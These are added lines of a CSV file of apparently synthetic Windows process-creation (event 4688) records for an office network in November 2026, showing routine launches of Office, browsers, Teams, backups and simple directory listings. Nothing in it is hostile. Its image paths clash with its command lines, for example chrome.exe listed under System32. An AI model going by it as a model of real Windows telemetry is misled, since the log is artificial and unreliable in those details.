+2026-11-10 09:12:40,4688,100287,WS-HR-07,nisha.gupta,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 09:13:09,4688,100289,WS-OPS-05,naveen.das,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:16:09,4688,100292,SQL01,admin02,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\health_check.ps1
+2026-11-10 09:22:15,4688,100294,WS-OPS-05,naveen.das,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 09:32:49,4688,100298,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:33:23,4688,100300,WS-HR-07,manoj.verma,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:35:58,4688,100302,WS-SALES-04,naveen.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:44:01,4688,100304,WS-HR-02,sanjay.pillai,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 09:46:20,4688,100306,WS-FIN-06,manoj.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 09:48:31,4688,100307,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 09:54:54,4688,100308,WS-OPS-05,naveen.das,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 10:04:41,4688,100311,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 10:05:17,4688,100312,WS-HR-02,sanjay.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 10:08:49,4688,100315,DC01,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c ipconfig /all
+2026-11-10 10:16:42,4688,100319,WS-SALES-04,pooja.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 10:17:07,4688,100320,WS-HR-07,nisha.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 10:24:17,4688,100321,WS-SALES-04,naveen.bose,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 10:27:51,4688,100322,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 10:30:10,4688,100323,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 10:34:41,4688,100325,WS-FIN-01,priya.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 10:42:43,4688,100327,WS-SALES-04,pooja.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 10:43:41,4688,100328,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 10:51:07,4688,100329,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 11:03:08,4688,100331,WS-SALES-04,naveen.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 11:07:20,4688,100335,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 11:09:37,4688,100336,DC01,admin01,C:\Windows\System32\mmc.exe,C:\Windows\System32\explorer.exe,mmc.exe C:\Windows\system32\dsa.msc
+2026-11-10 11:11:18,4688,100337,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 11:18:56,4688,100338,WS-HR-02,sanjay.pillai,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 11:21:12,4688,100340,WS-IT-02,admin02,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 11:21:30,4688,100341,WS-HR-07,manoj.verma,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 11:21:42,4688,100342,WS-HR-07,nisha.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 11:26:01,4688,100343,WS-IT-01,admin01,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 11:27:06,4688,100345,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 11:32:31,4688,100347,WS-HR-07,manoj.verma,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 11:52:28,4688,100348,WS-FIN-01,karthik.pillai,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 11:54:40,4688,100349,WS-FIN-06,manoj.iyer,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 11:57:00,4688,100351,WS-FIN-01,priya.shetty,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 12:14:41,4688,100356,WS-FIN-01,priya.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 12:14:54,4688,100357,WS-IT-01,admin01,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 12:15:46,4688,100358,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-10 12:25:39,4688,100359,WS-HR-07,nisha.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 12:29:52,4688,100360,WS-IT-02,admin02,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 12:38:15,4688,100362,WS-SALES-04,naveen.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 12:42:33,4688,100363,WS-IT-01,admin01,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 12:48:47,4688,100364,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 13:00:58,4688,100365,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 13:01:37,4688,100367,WS-FIN-01,priya.shetty,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 13:08:12,4688,100369,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 13:12:03,4688,100370,WS-FIN-01,priya.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 13:14:19,4688,100371,WS-FIN-06,manoj.iyer,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 13:21:43,4688,100372,WS-HR-02,harish.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 13:28:58,4688,100373,WS-OPS-05,naveen.das,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 13:30:54,4688,100374,WS-HR-02,harish.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 13:35:18,4688,100375,WS-HR-02,harish.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 13:41:53,4688,100376,WS-FIN-01,karthik.pillai,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 13:49:06,4688,100378,WS-FIN-06,manoj.iyer,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 13:52:01,4688,100379,WS-FIN-01,karthik.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 13:56:07,4688,100381,WS-HR-02,harish.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 14:01:16,4688,100382,WS-FIN-01,priya.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 14:09:06,4688,100383,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 14:10:04,4688,100384,WS-IT-02,admin02,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 14:15:57,4688,100385,WS-FIN-06,manoj.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 14:24:00,4688,100386,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 14:26:31,4688,100387,WS-SALES-04,naveen.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 14:27:22,4688,100388,WS-HR-07,manoj.verma,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 14:27:22,4688,100389,WS-HR-07,manoj.verma,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 14:46:27,4688,100393,WS-SALES-04,naveen.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 14:46:44,4688,100394,WS-OPS-05,naveen.das,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 14:47:01,4688,100395,WS-HR-07,manoj.verma,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 14:51:14,4688,100396,FS01,admin02,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\health_check.ps1
+2026-11-10 15:06:49,4688,100398,WS-HR-02,sanjay.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 15:09:02,4688,100399,WS-HR-02,sanjay.pillai,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 15:11:37,4688,100400,WS-IT-01,admin01,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 15:14:36,4688,100403,WS-IT-02,admin02,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 15:17:28,4688,100404,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 15:20:36,4688,100407,WS-ENG-08,vikram.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 15:22:44,4688,100408,WS-FIN-01,karthik.pillai,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 15:25:17,4688,100409,WS-HR-07,nisha.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 15:30:58,4688,100410,WS-FIN-01,priya.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 15:38:58,4688,100412,WS-SALES-04,pooja.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 15:44:35,4688,100413,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 15:46:41,4688,100414,WS-OPS-05,naveen.das,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 15:50:08,4688,100415,WS-SALES-04,pooja.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 15:55:08,4688,100416,WS-FIN-01,karthik.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 16:00:08,4688,100417,WS-FIN-06,shalini.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 16:02:36,4688,100418,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 16:03:35,4688,100419,WS-HR-02,harish.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 16:04:23,4688,100420,WS-IT-01,admin01,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 16:10:50,4688,100421,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 16:12:14,4688,100423,WS-HR-02,harish.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 16:16:40,4688,100424,WS-HR-07,manoj.verma,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 16:21:26,4688,100425,WS-FIN-01,karthik.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 16:24:10,4688,100426,WS-FIN-01,priya.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 16:26:39,4688,100427,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 16:28:41,4688,100429,WS-IT-01,admin01,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 16:35:28,4688,100432,WS-ENG-08,vikram.shetty,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 16:36:17,4688,100433,WS-IT-01,admin01,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 16:47:35,4688,100435,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-10 16:53:57,4688,100440,WS-ENG-08,vikram.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 16:56:56,4688,100441,WS-FIN-06,shalini.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-10 17:04:41,4688,100444,WS-FIN-01,karthik.pillai,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-10 17:05:31,4688,100445,WS-SALES-04,pooja.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-10 17:15:01,4688,100447,WS-FIN-06,manoj.iyer,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 17:19:21,4688,100448,WS-IT-02,admin02,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-10 17:20:18,4688,100449,WS-ENG-03,rohan.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 17:20:37,4688,100450,WS-ENG-08,vikram.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-10 17:35:48,4688,100455,DC01,admin01,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\health_check.ps1
+2026-11-10 17:40:04,4688,100458,WS-ENG-03,rohan.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 17:55:14,4688,100463,WS-IT-01,admin01,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-10 18:16:52,4688,100471,WS-FIN-06,manoj.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-10 19:53:37,4688,100478,WS-OPS-10,priya.kumar,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 20:49:25,4688,100480,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 20:54:30,4688,100481,WS-OPS-10,priya.kumar,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-10 20:58:02,4688,100483,WS-OPS-05,karthik.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-10 22:13:38,4688,100485,WS-OPS-05,karthik.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-10 23:16:33,4688,100486,WS-OPS-10,priya.kumar,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 23:31:23,4688,100487,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-10 23:37:03,4688,100489,WS-OPS-05,karthik.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-10 23:46:30,4688,100491,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 00:03:29,4688,100494,WS-OPS-05,karthik.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 00:17:14,4688,100495,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 01:10:28,4688,100500,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-11 01:20:30,4688,100501,WS-OPS-05,karthik.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 01:26:42,4688,100502,WS-OPS-05,karthik.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 01:49:47,4688,100503,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-11 02:13:12,4688,100505,WS-OPS-05,karthik.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 02:28:09,4688,100506,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 03:58:15,4688,100507,WS-OPS-05,karthik.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 05:53:28,4688,100509,WS-OPS-05,karthik.bose,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-11 07:54:58,4688,100514,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:19:06,4688,100516,WS-HR-07,nisha.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:22:13,4688,100518,WS-IT-02,admin02,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:26:49,4688,100520,WS-HR-02,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:27:36,4688,100522,WS-IT-02,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-11 08:27:39,4688,100523,WS-ENG-08,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:29:13,4688,100525,WS-FIN-06,shalini.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:33:47,4688,100526,WS-HR-02,sanjay.pillai,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 08:42:07,4688,100528,WS-ENG-03,rohan.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:43:29,4688,100531,WS-HR-02,harish.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:43:32,4688,100532,WS-FIN-01,karthik.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 08:45:13,4688,100533,WS-FIN-06,shalini.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 08:56:19,4688,100534,WS-ENG-03,rohan.iyer,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 09:02:22,4688,100536,WS-IT-01,admin01,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:05:04,4688,100538,WS-ENG-08,vikram.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 09:05:09,4688,100539,WS-FIN-01,karthik.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-11 09:06:38,4688,100541,WS-HR-07,manoj.verma,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:12:17,4688,100544,WS-OPS-05,naveen.das,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:12:35,4688,100545,WS-ENG-08,vikram.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-11 09:12:48,4688,100546,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-11 09:14:08,4688,100548,WS-SALES-04,naveen.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:17:43,4688,100549,WS-FIN-01,karthik.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-11 09:19:32,4688,100550,WS-OPS-05,naveen.das,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-11 09:34:05,4688,100552,WS-FIN-06,manoj.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:39:51,4688,100561,LT-NEW-02,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:40:26,4688,100563,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-11 09:40:36,4688,100564,WS-IT-01,admin01,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
